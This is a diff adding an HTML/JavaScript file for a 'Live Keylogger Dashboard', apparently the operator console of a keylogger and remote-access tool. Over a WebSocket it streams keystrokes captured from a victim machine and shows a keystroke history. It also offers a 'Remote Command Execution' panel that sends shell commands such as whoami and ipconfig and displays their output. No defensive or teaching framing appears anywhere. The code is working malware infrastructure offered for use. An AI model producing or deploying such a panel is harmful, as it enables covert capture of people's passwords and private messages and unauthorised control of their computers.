@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Keylogger Dashboard</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px;
+            background: #1e1e1e;
+            color: #d4d4d4;
+        }
+
+        h2 {
+            color: #4ec9b0;
+            border-bottom: 2px solid #4ec9b0;
+            padding-bottom: 10px;
+        }
+
+        #status {
+            margin-bottom: 15px;
+            padding: 10px;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+
+        .connected { background: #2d5a3d; color: #4ec9b0; }
+        .disconnected { background: #5a3d3d; color: #ce9178; }
+
+        /* Command Section */
+        #commandSection {
+            margin: 20px 0;
+            padding: 15px;
+            background: #252526;
+            border-radius: 5px;
+            border: 1px solid #444;
+        }
+
+        #commandInput {
+            width: 70%;
+            padding: 10px;
+            background: #1e1e1e;
+            color: #d4d4d4;
+            border: 1px solid #444;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+
+        #sendBtn {
+            width: 25%;
+            margin-left: 10px;
+            padding: 10px;
+            background: #4ec9b0;
+            color: #1e1e1e;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        #sendBtn:hover { background: #5dd9c0; }
+
+        #sendBtn:disabled {
+            background: #555;
+            cursor: not-allowed;
+        }
+
+        /* Output Display */
+        #cmdOutput {
+            margin-top: 15px;
+            padding: 15px;
+            background: #1e1e1e;
+            border: 1px solid #444;
+            border-radius: 3px;
+            min-height: 150px;
+            max-height: 300px;
+            overflow-y: auto;
+            font-size: 12px;
+            white-space: pre-wrap;
+            color: #d4d4d4;
+        }
+
+        .output-header {
+            color: #4ec9b0;
+            font-weight: bold;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 5px;
+        }
+
+        .output-line {
+            padding: 2px 0;
+            border-bottom: 1px solid #2a2a2a;
+        }
+
+        .output-time {
+            color: #858585;
+            font-size: 10px;
+        }
+
+        #keystrokes {
+            height: 300px;
+            border: 1px solid #444;
+            padding: 15px;
+            overflow-y: auto;
+            background: #252526;
+            font-size: 13px;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            margin-top: 20px;
+        }
+
+        .entry {
+            padding: 3px 0;
+            border-bottom: 1px solid #333;
+            animation: fadeIn 0.3s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .time { color: #858585; }
+        .key { color: #569cd6; font-weight: bold; }
+        .text { color: #ce9178; }
+
+        .stats {
+            margin-top: 15px;
+            padding: 15px;
+            background: #252526;
+            border-radius: 5px;
+            display: flex;
+            gap: 30px;
+        }
+
+        .stat-box {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 28px;
+            color: #4ec9b0;
+            font-weight: bold;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: #858585;
+            margin-top: 5px;
+        }
+
+        button {
+            margin-top: 15px;
+            padding: 10px 25px;
+            background: #0e639c;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        button:hover { background: #1177bb; }
+        
+        #debug {
+            margin-top: 10px;
+            padding: 10px;
+            background: #333;
+            color: #aaa;
+            font-size: 11px;
+            border-radius: 3px;
+            max-height: 100px;
+            overflow-y: auto;
+        }
+
+        .section-title {
+            color: #569cd6;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>🔴 Live Keylogger Dashboard</h2>
+
+    <div id="status" class="disconnected">Connecting...</div>
+
+    <!-- Command Section -->
+    <div id="commandSection">
+        <div class="section-title">💻 Remote Command Execution</div>
+        <input type="text" id="commandInput" placeholder="Enter command (e.g., whoami, dir, ipconfig)..." />
+        <button id="sendBtn" onclick="sendCommand()">Send Command</button>
+        
+        <div id="cmdOutput">
+            <div class="output-header">Command Output:</div>
+            <div id="outputContent">Waiting for commands...</div>
+        </div>
+    </div>
+
+    <!-- Keystrokes Section -->
+    <div class="section-title">⌨️ Keystrokes</div>
+    <div id="keystrokes">Waiting for data...</div>
+
+    <div class="stats">
+        <div class="stat-box">
+            <div class="stat-value" id="count">0</div>
+            <div class="stat-label">Keystrokes</div>
+        </div>
+        <div class="stat-box">
+            <div class="stat-value" id="lastKey">-</div>
+            <div class="stat-label">Last Key</div>
+        </div>
+    </div>
+
+    <button onclick="clearDisplay()">Clear Display</button>
+    
+    <div id="debug">Debug log...</div>
+
+    <script>
+        const keystrokes = document.getElementById("keystrokes");
+        const status = document.getElementById("status");
+        const countEl = document.getElementById("count");
+        const lastKeyEl = document.getElementById("lastKey");
+        const debugEl = document.getElementById("debug");
+        const commandInput = document.getElementById("commandInput");
+        const sendBtn = document.getElementById("sendBtn");
+        const outputContent = document.getElementById("outputContent");
+        
+        let keystrokeCount = 0;
+        let hasReceivedData = false;
+
+        function log(msg) {
+            console.log(msg);
+            debugEl.innerHTML += msg + "<br>";
+            debugEl.scrollTop = debugEl.scrollHeight;
+        }
+
+        const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
+        const wsUrl = `${protocol}//${window.location.host}`;
+        
+        log("Connecting to: " + wsUrl);
+        
+        const socket = new WebSocket(wsUrl);
+
+        socket.onopen = () => {
+            log("Connected!");
+            status.innerText = "🟢 Connected - Waiting for keystrokes...";
+            status.className = "connected";
+            sendBtn.disabled = false;
+        };
+
+        socket.onmessage = (event) => {
+            log("Raw message: " + event.data.substring(0, 100));
+            
+            try {
+                const data = JSON.parse(event.data);
+                log("Parsed type: " + data.type);
+
+                if (data.type === "history") {
+                    keystrokes.innerHTML = data.data || "No previous data";
+                    hasReceivedData = true;
+                } 
+                else if (data.type === "keystroke") {
+                    if (!hasReceivedData) {
+                        keystrokes.innerHTML = "";
+                        hasReceivedData = true;
+                    }
+                    addKeystroke(data);
+                }
+                else if (data.type === "cmd_output") {
+                    // Display command output
+                    displayOutput(data.data, data.time);
+                }
+                else if (data.type === "ack") {
+                    log("ACK received: " + data.event_id);
+                }
+            } catch (err) {
+                log("Parse error: " + err.message);
+            }
+        };
+
+        socket.onclose = () => {
+            log("Disconnected");
+            status.innerText = "🔴 Disconnected - Refresh page to reconnect";
+            status.className = "disconnected";
+            sendBtn.disabled = true;
+        };
+
+        socket.onerror = (err) => {
+            log("WebSocket error occurred");
+            status.innerText = "⚠️ Connection error";
+        };
+
+        function sendCommand() {
+            const cmd = commandInput.value.trim();
+            if (!cmd) return;
+            
+            if (socket.readyState === WebSocket.OPEN) {
+                socket.send(JSON.stringify({
+                    type: "send_command",
+                    command: cmd
+                }));
+                
+                // Show sent command in output
+                const div = document.createElement("div");
+                div.className = "output-line";
+                div.innerHTML = `<span class="output-time">[${new Date().toLocaleTimeString()}]</span> <span style="color:#4ec9b0">> ${cmd}</span>`;
+                outputContent.appendChild(div);
+                
+                commandInput.value = "";
+            } else {
+                alert("Not connected!");
+            }
+        }
+
+        // Enter key sends command
+        commandInput.addEventListener("keypress", (e) => {
+            if (e.key === "Enter") sendCommand();
+        });
+
+        function displayOutput(output, time) {
+            const div = document.createElement("div");
+            div.className = "output-line";
+            div.innerHTML = `<span class="output-time">[${time || new Date().toLocaleTimeString()}]</span> <pre style="margin:0;color:#d4d4d4;">${output}</pre>`;
+            outputContent.appendChild(div);
+            document.getElementById("cmdOutput").scrollTop = document.getElementById("cmdOutput").scrollHeight;
+        }
+
+        function addKeystroke(data) {
+            const div = document.createElement("div");
+            div.className = "entry";
+            div.innerHTML = `<span class="time">[${data.time}]</span> <span class="key">${data.key.padEnd(8)}</span> <span class="text">"${data.text}"</span>`;
+            
+            keystrokes.appendChild(div);
+            keystrokes.scrollTop = keystrokes.scrollHeight;
+            
+            keystrokeCount++;
+            countEl.innerText = keystrokeCount;
+            lastKeyEl.innerText = data.key;
+            
+            while (keystrokes.children.length > 200) {
+                keystrokes.removeChild(keystrokes.firstChild);
+            }
+        }
+
+        function clearDisplay() {
+            keystrokes.innerHTML = "";
+            keystrokeCount = 0;
+            countEl.innerText = "0";
+            lastKeyEl.innerText = "-";
+            outputContent.innerHTML = '<div class="output-header">Command Output:</div>';
+        }
+    </script>
+
+</body>
+</html>
